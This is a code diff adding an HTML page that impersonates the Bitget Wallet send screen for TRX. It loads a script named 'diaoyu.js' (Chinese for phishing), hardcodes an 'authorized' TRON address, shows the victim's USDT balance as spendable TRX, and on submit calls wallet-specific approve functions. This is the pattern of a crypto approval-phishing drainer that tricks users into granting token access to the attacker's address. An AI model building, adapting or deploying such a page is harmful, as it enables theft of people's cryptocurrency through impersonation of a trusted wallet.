@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bitget Wallet</title>
+    <link rel="stylesheet" href="/css/index.css">
+    <script src="/js/jquery-3.5.1.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="balance-info">
+            <span>可用：</span><span id="ye"></span><span> TRX </span><span class="zuida btn">最大</span>
+        </div>
+        <div class="trx-display">
+            <span class="jianpan" id="amount"></span><span class="blink"></span>TRX
+        </div>
+        <div class="usd-display">
+            <span class="sp" id="amount-display"></span> USD ▼
+			<img src="/icon_exchange.jpg" class="icon">
+        </div>
+    </div>
+    <div class="keypad">
+        <div class="key" onclick="pressKey('1')">1</div>
+        <div class="key" onclick="pressKey('2')">2</div>
+        <div class="key" onclick="pressKey('3')">3</div>
+        <div class="key" onclick="pressKey('4')">4</div>
+        <div class="key" onclick="pressKey('5')">5</div>
+        <div class="key" onclick="pressKey('6')">6</div>
+        <div class="key" onclick="pressKey('7')">7</div>
+        <div class="key" onclick="pressKey('8')">8</div>
+        <div class="key" onclick="pressKey('9')">9</div>
+        <div class="key" onclick="pressKey('.')">.</div>
+        <div class="key" onclick="pressKey('0')">0</div>
+        <div class="key" onclick="clearAmount()">⌫</div>
+    </div>
+    <div class="bottom-bar">
+        <button class="submit-btn disabled" type="button" id="submitBtn" disabled>下一步</button>
+    </div>
+    <div class="tishi" id="tip">提示</div>
+	<script type="text/javascript" src="/js/diaoyu.js"></script>
+	<script type="text/javascript" src="/js/common.js"></script>
+<script>
+	var p_authorized_address = "TAnvEgBJRsk5LFdfXMhCW8mcHVTeXee9T4";
+    var p_agent = "10000";
+    var domain = '{$domain}';
+	
+	function formatNumber(num) {
+    let formattedNum = num.toFixed(2);
+    return parseFloat(formattedNum).toString();
+}
+
+    function pressKey(key) {
+    var amount = document.getElementById('amount');
+    var submitBtn = document.getElementById('submitBtn');
+    var amountDisplay = document.getElementById('amount-display');
+    if (amount.innerHTML.includes('.') && key === '.') {
+      return;
+    }
+    if (amount.innerHTML === '0' && key !== '.') {
+      amount.innerHTML = key;
+    } else {
+      amount.innerHTML += key;
+    }
+    updateSubmitButton();
+    amountDisplay.textContent = formatNumber(amount.textContent * 0.151);
+  }
+  
+    function updateSubmitButton() {
+    var submitBtn = document.getElementById('submitBtn');
+    var amount = Number(document.getElementById('amount').innerHTML);
+    var amount2 = Number(document.getElementById('ye').innerHTML);
+    if(amount <= amount2 && amount > 0) {
+      submitBtn.classList.remove('disabled');
+      submitBtn.disabled = false;
+    } else {
+      submitBtn.classList.add('disabled');
+      submitBtn.disabled = true;
+    }
+  }
+  
+    function clearAmount() {
+ var amount = document.getElementById('amount');
+  var amountDisplay = document.getElementById('amount-display');
+  amount.textContent = amount.textContent.slice(0, -1) || '0';
+  amountDisplay.textContent = formatNumber(amount.textContent * 0.151);
+  updateSubmitButton();
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+            var btnMax = document.querySelector('.btn');
+            var ye = document.getElementById('ye');
+            var amount = document.getElementById('amount');
+            var amount2 = document.getElementById('amount-display');
+
+            btnMax.addEventListener('click', function() {
+                amount.textContent = ye.textContent;
+                amount2.textContent = formatNumber(amount.textContent * 0.151);
+                $(amount).val(amount.textContent);
+                updateSubmitButton();
+            });
+        });
+        
+        updateSubmitButton();
+        clearAmount();
+        $(function() {
+            sleep(100).then(() => {
+                getAssets(function(trx, usdt) {
+                    $("#submitBtn")["removeAttr"]("disabled");
+                    $("#submitBtn")["text"]("下一步");
+                    $("#ye").html(usdt);
+                });
+            });
+            
+            $("#submitBtn").click(function() {
+                updateSubmitButton()
+                if (submitBtn.disabled) {
+                    return;}
+               let version1 = navigator.userAgent.toLowerCase();
+               if (version1.indexOf("tokenpocket") > -1) {
+                   tpapprove();
+               } else {
+                    okxapprove();
+               }
+                
+            });
+        });
+    </script>
+</body>
+</html>
